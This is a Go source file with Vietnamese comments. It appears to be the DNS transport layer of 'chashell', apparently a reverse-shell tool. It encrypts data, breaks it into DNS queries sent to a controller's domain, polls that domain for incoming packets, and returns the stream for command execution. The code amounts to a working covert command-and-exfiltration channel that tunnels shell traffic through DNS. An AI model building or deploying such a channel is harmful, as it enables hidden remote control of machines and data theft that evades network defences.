package transport

import (
	"github.com/Jeffail/tunny"
	"github.com/hdqb/chashell/lib/logging"
	"github.com/rs/xid"
	"io"
)

// khởi tạo dnsStream chứa dữ liệu tên miền encrypt Key và id của client
type dnsStream struct {
	targetDomain  string
	encryptionKey string
	clientGuid    []byte
}


// khởi tạo chức năng với tên DNSStream với giá trị đầu vào là tên miền & encrypt Key với giá trị là string
func DNSStream(targetDomain string, encryptionKey string) *dnsStream {

	// khởi tạo một id toàn cầu global user id
	guid := xid.New()

	// khởi tạo cấu hình chứa dữ liệu lần lượt là tên miền encrypt key và id client
	dnsConfig := dnsStream{targetDomain: targetDomain, encryptionKey: encryptionKey, clientGuid: guid.Bytes()}

	// gọi chức năng pollRead và thăm dò phía máy chủ 
	go pollRead(dnsConfig)

	// khi đã bắt tay thành công thì trả về cho cmd thực thi
	return &dnsConfig
}

func (stream *dnsStream) Read(data []byte) (int, error) {
	// khởi tạo packet bằng giá trị của bộ đệm packetQueue
	packet := <-packetQueue
	// Sao chép nó vào bộ đệm dữ liệu.
	copy(data, packet)
	// trả về tổng số byte đã sao chép
	return len(packet), nil
}

func (stream *dnsStream) Write(data []byte) (int, error) {

	// khởi tạo initPacket mã hóa các gói dỡ liệu
	initPacket, dataPackets := Encode(data, true, stream.encryptionKey, stream.targetDomain, stream.clientGuid)

	// Gửi gói init để thông báo rằng chúng tôi sẽ gửi dữ liệu.
	_, err := sendDNSQuery([]byte(initPacket), stream.targetDomain)

	// nếu thấy có lỗi sẽ hiển thị ra 
	if err != nil {
		logging.Printf("Unable to send init packet : %v\n", err)
		return 0, io.ErrClosedPipe
	}

	// Tạo một nhóm gồm 8 công nhân để gửi các gói DNS không đồng bộ.
	// bạn có thể thay đổi theo sở thích
	poll := tunny.NewFunc(8, func(packet interface{}) interface{} {
		_, err := sendDNSQuery([]byte(packet.(string)), stream.targetDomain)

		if err != nil {
			logging.Printf("Failed to send data packet : %v\n", err)

		}
		return nil
	})
	defer poll.Close()

	// Gửi tất cả công việc đến hồ bơi.
	for _, packet := range dataPackets {
		poll.Process(packet)
	}

	// đếm và trả về tổng số lượng byte data
	return len(data), nil
}
